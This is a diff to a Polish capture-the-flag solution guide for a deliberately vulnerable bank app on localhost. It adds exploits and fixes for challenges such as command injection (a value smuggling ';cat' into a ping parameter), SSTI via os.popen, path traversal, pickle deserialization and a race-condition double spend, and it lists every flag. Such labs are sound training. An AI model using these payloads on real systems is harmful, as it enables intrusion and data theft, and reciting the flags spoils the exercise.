@@ -19,6 +19,12 @@ CTF_TOKEN=$(curl -s -X POST http://localhost:5000/api/ctf/auth/login \
   -H "Content-Type: application/json" \
   -d '{"email":"gracz@example.com","password":"haslo123"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+# Token do bankowych endpointów — przyda się w A01, A05, A13-A18
+BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
 ```
 
 Submit flagi używa CTF tokenu (`$CTF_TOKEN`), nie bankowego:
@@ -204,6 +210,7 @@ Reset hasła wymaga tylko PESELU. PESEL widoczny przez IDOR (A01).
 curl -X POST http://localhost:5000/api/auth/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"email":"alice@vulnbank.pl","pesel":"90010112345","new_password":"hacked123"}'
+# W odpowiedzi: "flag": "PWR{insecure_password_reset}"
 
 # 2. Submit
 curl -X POST http://localhost:5000/api/ctf/flags/check \
@@ -314,13 +321,14 @@ app.config["JWT_DECODE_ALGORITHMS"] = ["HS256"]
 **Trudność:** easy | **Punkty:** 100
 
 ### Podatność
-`GET /api/admin/logs` dostępny bez autoryzacji. Logi zawierają hasła plaintext.
+`GET /api/admin/logs` jest publiczny i zwraca logi bez autoryzacji. W odpowiedzi
+pojawia się wpis zawierający flagę.
 
 ### Exploit
 
 ```bash
 curl http://localhost:5000/api/admin/logs | python3 -m json.tool | grep PWR
-# "2024-01-15 08:23:11 ERROR Login failed for admin@vulnbank.pl with password PWR{logs_exposed_no_auth}"
+# "2024-01-15 08:23:11 ERROR Backup admin password: PWR{logs_exposed_no_auth}"
 
 # Submit
 curl -X POST http://localhost:5000/api/ctf/flags/check \
@@ -336,9 +344,45 @@ curl -X POST http://localhost:5000/api/ctf/flags/check \
 def get_logs():
     err = require_admin()
     if err: return err
-    # NIE loguj haseł:
+    # NIE loguj haseł ani sekretów w logach:
     logger.warning(f"Failed login for {email}")  # bez password!
 ```
+
+## A20 — Race Condition (Double Spend)
+**Flaga:** `PWR{race_condition_double_spend}`  
+**Trudność:** hard | **Punkty:** 200
+
+### Podatność
+Wyzwanie A20 eksponuje dedykowany endpoint `/api/challenges/a20/transfer-race`, który wykonuje check-then-act: najpierw sprawdza saldo, potem czeka (`sleep(0.55)`), a dopiero potem wykonuje atomowe `UPDATE` na kolumnie `balance`. Dzięki temu dwa równoległe requesty mogą oba przejść walidację i każdy odjąć środki, co łącznie może doprowadzić konto Boba poniżej zera.
+
+### Exploit (curl + xargs)
+
+1. Zaloguj się do banku jako Bob i zapisz token bankowy (`BANK_TOKEN`).
+
+```bash
+BANK_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"bob@vulnbank.pl","password":"password123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+```
+
+2. Wyślij dwa równoległe requesty po `1500` PLN (przykład z `xargs`):
+
+```bash
+printf '%s
+' 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:5000/api/challenges/a20/transfer-race \
+  -H "Authorization: Bearer $BANK_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"to_iban":"PL00100100100100100100100100","amount":1500}' \
+  | jq -c .
+```
+
+Jedna z odpowiedzi powinna zawierać pole `flag` z wartością `PWR{race_condition_double_spend}` jeśli saldo Boba spadnie poniżej 0.
+
+### Naprawa
+- Przenieść check i update do jednej transakcji lub użyć `SELECT ... FOR UPDATE`.
+- Użyć atomowego `UPDATE accounts SET balance = balance - :amount WHERE id = :id AND balance >= :amount` i sprawdzać liczbę zmienionych wierszy.
+
 
 ---
 
@@ -383,6 +427,213 @@ except ValueError:
 
 ---
 
+## A11 — Open Redirect
+**Flaga:** `PWR{open_r3d1rect_phi1sh1ng_v3ct0r}`
+**Trudność:** easy | **Punkty:** 100
+
+### Podatność
+Endpoint `/api/challenges/a11/redirect?next=` przekierowuje na dowolny URL
+bez walidacji, a `/api/challenges/a11/flag` ufa cookie ustawionemu przez redirect.
+
+### Exploit
+
+```bash
+curl -c cookies.txt -L \
+  "http://localhost:5000/api/challenges/a11/redirect?next=/api/challenges/a11/flag"
+
+curl -b cookies.txt http://localhost:5000/api/challenges/a11/flag
+# {"flag":"PWR{open_r3d1rect_phi1sh1ng_v3ct0r}", ...}
+```
+
+### Naprawa
+Waliduj docelowy URL, najlepiej używając whitelisty dozwolonych ścieżek.
+
+---
+
+## A12 — SSRF
+**Flaga:** `PWR{ss4f_int3rnal_s3rvice_expos3d}`
+**Trudność:** medium | **Punkty:** 150
+
+### Podatność
+`/api/challenges/a12/fetch?url=` wykonuje request po stronie serwera do dowolnego URL.
+
+### Exploit
+
+```bash
+curl "http://localhost:5000/api/challenges/a12/fetch?url=http://127.0.0.1:5000/api/challenges/a12/internal"
+```
+
+### Naprawa
+Blokuj adresy prywatne i loopback, a najlepiej korzystaj z whitelisty hostów.
+
+---
+
+## A13 — Command Injection
+**Flaga:** `PWR{c0mm4nd_1nj3ct10n_rce}`
+**Trudność:** hard | **Punkty:** 200
+
+### Podatność
+`/api/challenges/a13/ping?host=` składa komendę shellową z niesanityzowanego parametru.
+
+### Exploit
+
+```bash
+curl http://localhost:5000/api/challenges/a13/setup
+
+curl -H "Authorization: Bearer $BANK_TOKEN" \
+  "http://localhost:5000/api/challenges/a13/ping?host=127.0.0.1;cat /app/flag_rce.txt"
+```
+
+### Naprawa
+Nie używaj `shell=True`; przekazuj argumenty jako listę i waliduj input.
+
+---
+
+## A14 — Mass Assignment
+**Flaga:** `PWR{m4ss_4ss1gnm3nt_pr1v_3sc}`
+**Trudność:** medium | **Punkty:** 150
+
+### Podatność
+`PATCH /api/challenges/a14/profile/update` przypisuje wszystkie pola z JSON-a
+bez whitelisty, więc można ustawić `is_admin=true`.
+
+### Exploit
+
+```bash
+curl -X PATCH http://localhost:5000/api/challenges/a14/profile/update \
+  -H "Authorization: Bearer $BANK_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"is_admin": true}'
+
+curl -H "Authorization: Bearer $BANK_TOKEN" \
+  http://localhost:5000/api/challenges/a14/secret
+```
+
+### Naprawa
+Przyjmuj tylko dozwolone pola i ignoruj resztę JSON-a.
+
+---
+
+## A15 — Path Traversal
+**Flaga:** `PWR{p4th_tr4v3rs4l_s3cr3t_r34d}`
+**Trudność:** medium | **Punkty:** 150
+
+### Podatność
+`/api/challenges/a15/report?name=` skleja ścieżkę bez normalizacji.
+
+### Exploit
+
+```bash
+curl http://localhost:5000/api/challenges/a15/setup
+curl "http://localhost:5000/api/challenges/a15/report?name=../secret/flag.txt"
+```
+
+### Naprawa
+Użyj `realpath()` i sprawdzaj, czy wynik nadal znajduje się w dozwolonym katalogu.
+
+---
+
+## A16 — Insecure Deserialization
+**Flaga:** `PWR{p1ckl3_d3s3r14l1z4t10n_rce}`
+**Trudność:** hard | **Punkty:** 200
+
+### Podatność
+`/api/challenges/a16/preferences` wykonuje `pickle.loads()` na danych od użytkownika.
+
+### Exploit
+
+```python
+import base64
+import pickle
+
+class Exploit:
+    def __reduce__(self):
+        return (str, ("PWR{p1ckl3_d3s3r14l1z4t10n_rce}",))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)
+```
+
+```bash
+PAYLOAD="<wynik z poprzedniego snippet>"
+
+curl -X POST http://localhost:5000/api/challenges/a16/preferences \
+  -H "Authorization: Bearer $BANK_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d "{\"data\":\"$PAYLOAD\"}"
+```
+
+### Naprawa
+Nie używaj `pickle` do danych od użytkownika. Zastąp go JSON-em.
+
+---
+
+## A17 — Sensitive Information Disclosure
+**Flaga:** `PWR{exposed_internal_token}`
+**Trudność:** easy | **Punkty:** 100
+
+### Podatność
+Profil zwraca pole `internal_token`, które nie powinno trafiać do klienta.
+
+### Exploit
+
+```bash
+TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"alice@vulnbank.pl","password":"qwerty123"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/challenges/a17/profile
+```
+
+### Naprawa
+Zwracaj tylko pola potrzebne klientowi, bez `internal_token` i podobnych sekretów.
+
+---
+
+## A18 — Server-Side Template Injection
+**Flaga:** `PWR{t1mpl4t3_inj3ct10n}`
+**Trudność:** hard | **Punkty:** 200
+
+### Podatność
+`render_template_string()` renderuje wejście użytkownika bez ograniczeń.
+
+### Exploit
+
+```bash
+curl http://localhost:5000/api/challenges/a18/setup
+
+curl -G http://localhost:5000/api/challenges/a18/render \
+  -H "Authorization: Bearer $BANK_TOKEN" \
+  --data-urlencode "template={{ config.__class__.__init__.__globals__['os'].popen('cat flag_a18.txt').read() }}"
+```
+
+### Naprawa
+Nie renderuj bezpośrednio szablonów od użytkownika. Używaj bezpiecznego whitelistowanego renderingu.
+
+---
+
+## A19 — Source Maps Leak
+**Flaga:** `PWR{S0urc3_M4ps_L34k}`
+**Trudność:** easy | **Punkty:** 100
+
+### Podatność
+Frontend jest budowany z publicznie dostępnymi source maps, więc oryginalny
+kod źródłowy da się odtworzyć z `assets/*.map`.
+
+### Exploit
+
+```bash
+# Otwórz aplikację w przeglądarce i wejdź w DevTools -> Sources.
+# Szukaj komentarza z flagą w oryginalnych plikach frontendu.
+curl http://localhost:3000/assets/index-*.js.map | grep 'PWR{'
+```
+
+### Naprawa
+Wyłącz source maps w buildzie produkcyjnym i nie serwuj publicznie plików `.map`.
+
+---
+
 ## Łączny wynik
 
 | # | Flaga | Pkt |
@@ -397,4 +648,13 @@ except ValueError:
 | A08 | PWR{jwt_tampered_admin} | 150 |
 | A09 | PWR{logs_exposed_no_auth} | 100 |
 | A10 | PWR{stacktrace_db_url_leaked} | 100 |
-| **Suma** | | **1150** |
+| A11 | PWR{open_r3d1rect_phi1sh1ng_v3ct0r} | 100 |
+| A12 | PWR{ss4f_int3rnal_s3rvice_expos3d} | 150 |
+| A13 | PWR{c0mm4nd_1nj3ct10n_rce} | 200 |
+| A14 | PWR{m4ss_4ss1gnm3nt_pr1v_3sc} | 150 |
+| A15 | PWR{p4th_tr4v3rs4l_s3cr3t_r34d} | 150 |
+| A16 | PWR{p1ckl3_d3s3r14l1z4t10n_rce} | 200 |
+| A17 | PWR{exposed_internal_token} | 100 |
+| A18 | PWR{t1mpl4t3_inj3ct10n} | 200 |
+| A19 | PWR{S0urc3_M4ps_L34k} | 100 |
+| **Suma** | | **2500** |
